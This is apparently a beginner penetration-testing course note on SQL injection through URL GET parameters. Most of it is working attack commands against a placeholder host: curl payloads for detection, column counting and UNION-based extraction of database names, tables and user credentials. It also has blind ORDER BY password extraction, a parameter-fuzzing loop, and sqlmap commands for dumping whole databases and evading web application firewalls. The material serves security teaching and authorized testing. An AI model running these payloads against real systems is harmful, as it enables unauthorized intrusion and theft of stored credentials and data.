---
tags: [vapt, sqli, beginner]
difficulty: beginner
module: "06 - SQL Injection"
topic: "06.09 SQLi in GET Parameters"
---

# 06.09 — SQLi in GET Parameters

## What Are GET Parameters?

GET parameters are key-value pairs appended to a URL after the `?` symbol. They're sent in the URL itself — making them visible in browser address bars, server logs, and referrer headers.

```
URL ANATOMY:
  https://target.com/search?category=books&sort=price&page=1
                             ↑            ↑          ↑
                             param1      param2     param3

ALL PARAMS ARE INJECTION CANDIDATES!
```

---

## Common GET Parameter SQLi Injection Points

```
HIGH-VALUE PARAMETERS:
  ?id=1           → primary key lookup (most common!)
  ?user=admin     → username lookup
  ?category=shoes → category filter
  ?search=test    → search query
  ?order=price    → ORDER BY column (tricky!)
  ?sort=asc       → ORDER BY direction
  ?page=1         → LIMIT/OFFSET
  ?filter=active  → WHERE condition
  ?type=product   → type filter
  ?lang=en        → language lookup
  ?ref=homepage   → referrer tracking
```

---

## Testing GET Parameter Injection

```bash
# BASIC DETECTION — ADD QUOTE:
curl "https://target.com/product?id=1'"
# → SQL error? → CONFIRMED!

# CANONICAL BOOLEAN TEST:
curl "https://target.com/product?id=1 AND 1=1--"   # TRUE → normal response
curl "https://target.com/product?id=1 AND 1=2--"   # FALSE → different response

# NUMERIC vs STRING CONTEXT:
# NUMERIC (no quotes in original query):
#   SELECT * FROM products WHERE id = 1
#   Injection: ?id=1 OR 1=1--

# STRING CONTEXT (quotes in original query):
#   SELECT * FROM products WHERE category = 'books'
#   Injection: ?category=books' OR '1'='1

# DETECT CONTEXT:
curl "https://target.com/search?category=books'"     # string context error
curl "https://target.com/product?id=1'"              # numeric context error
```

---

## URL Encoding

Special characters in URLs must be percent-encoded:

```
CHARACTER  URL-ENCODED  WHY
  '        %27          starts/ends string
  "        %22          double quote
  space    %20 or +     space
  #        %23          MySQL comment
  &        %26          breaks URL params
  =        %3D          separates key=value
  ;        %3B          statement separator
  (        %28          parenthesis open
  )        %29          parenthesis close
  ,        %2C          comma

EXAMPLES:
  ?id=1' OR '1'='1
  URL-encoded: ?id=1%27%20OR%20%271%27%3D%271

  ?id=1 AND SLEEP(5)--
  URL-encoded: ?id=1%20AND%20SLEEP(5)--

# CURL HANDLES ENCODING:
curl "https://target.com/product?id=1' OR '1'='1" 
# curl auto-encodes the URL correctly
# OR use --data-urlencode for POST
```

---

## Full GET Parameter Exploitation Examples

```bash
# SCENARIO: /product?id=1 (numeric parameter)

# STEP 1: Detect
curl "https://target.com/product?id=1'"
# → 500 Internal Server Error with MySQL error

# STEP 2: Confirm
curl "https://target.com/product?id=1 AND 1=1--"   # → 200 with product
curl "https://target.com/product?id=1 AND 1=2--"   # → 404 or empty

# STEP 3: Count columns
curl "https://target.com/product?id=1 ORDER BY 1--"  # → 200
curl "https://target.com/product?id=1 ORDER BY 2--"  # → 200
curl "https://target.com/product?id=1 ORDER BY 3--"  # → 200
curl "https://target.com/product?id=1 ORDER BY 4--"  # → 500 error → 3 columns!

# STEP 4: Find visible column
curl "https://target.com/product?id=99 UNION SELECT 'col1','col2','col3'--"
# → Page shows "col2" → column 2 is visible

# STEP 5: Extract data
curl "https://target.com/product?id=99 UNION SELECT NULL,version(),NULL--"
curl "https://target.com/product?id=99 UNION SELECT NULL,database(),NULL--"
curl "https://target.com/product?id=99 UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--"
curl "https://target.com/product?id=99 UNION SELECT NULL,GROUP_CONCAT(username,':',password),NULL FROM users--"
```

---

## ORDER BY / SORT Injection

ORDER BY is a special case — it can't use UNION or boolean operators directly:

```sql
-- VULNERABLE CODE:
$sort = $_GET['sort'];
$sql = "SELECT * FROM products ORDER BY " . $sort;

-- DETECTION (causes error by providing invalid column):
?sort=1       → valid → no error
?sort=2       → valid → no error
?sort=abc     → invalid column → SQL error!
?sort=1--     → comments out rest → might work

-- EXTRACTING DATA VIA ORDER BY:
-- Can't use UNION here, but can use conditional sorting:

-- MySQL:
?sort=(CASE WHEN (1=1) THEN price ELSE name END)
→ sorts by price (true condition)

?sort=(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='5' THEN price ELSE name END)
→ if first char of admin password is '5', sorts by price
→ observe sort order to determine TRUE/FALSE!

-- TIME-BASED WORKS BETTER:
?sort=(CASE WHEN (condition) THEN SLEEP(5) ELSE 0 END)

-- SQLMAP HANDLES ORDER BY:
sqlmap -u "https://target.com/products?sort=1" -p sort --no-cast
```

---

## Multiple Parameters — Test All!

```bash
# ALL PARAMS ARE CANDIDATES:
# https://target.com/search?term=shoes&category=clothing&min_price=10&max_price=100&sort=name&page=1

# TEST EACH ONE:
for param in "term=shoes'" "category=clothing'" "min_price=10'" "max_price=100'" "sort=name'" "page=1'"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/search?$param")
  echo "$code $param"
done

# SQLMAP ALL PARAMETERS:
sqlmap -u "https://target.com/search?term=shoes&category=clothing&min_price=10&max_price=100" \
  --level=3 --risk=1  # test all params at level 3
```

---

## GET vs POST: Security Implications

```
GET PARAMETERS ARE LOGGED IN:
  ✓ Web server access logs (/var/log/nginx/access.log)
  ✓ Browser history
  ✓ Referrer headers (sent to third-party sites)
  ✓ CDN/proxy logs
  ✓ Bookmarks / shared URLs

IMPLICATION FOR PENTESTERS:
  → Your SQLi payloads in GET params may appear in logs!
  → If log file is reviewed → discovered
  → Less stealthy than POST injection

FOR DEFENDERS:
  → NEVER put sensitive data in GET params
  → User IDs, search terms OK in GET (not passwords, tokens, credit cards!)
  → Consider GET params "public" data
```

---

## Automating with SQLMap

```bash
# BASIC SCAN:
sqlmap -u "https://target.com/product?id=1"

# TEST SPECIFIC PARAMETER:
sqlmap -u "https://target.com/search?term=test&category=books" -p term

# DUMP EVERYTHING:
sqlmap -u "https://target.com/product?id=1" --dump-all

# WITH COOKIES (authenticated):
sqlmap -u "https://target.com/product?id=1" \
  --cookie="session=ABCDEF123"

# RANDOM AGENT (avoid WAF):
sqlmap -u "https://target.com/product?id=1" --random-agent

# TAMPER SCRIPTS (WAF bypass):
sqlmap -u "https://target.com/product?id=1" \
  --tamper=space2comment,between,randomcase
```

---

## Related Notes
- [[01 - What is SQL Injection]] — SQLi fundamentals
- [[10 - SQLi in POST Body]] — POST parameter injection
- [[11 - SQLi in HTTP Headers]] — header injection
- [[13 - SQLi in ORDER BY GROUP BY]] — ORDER BY specific techniques
- [[21 - sqlmap Full Usage Guide]] — full sqlmap reference
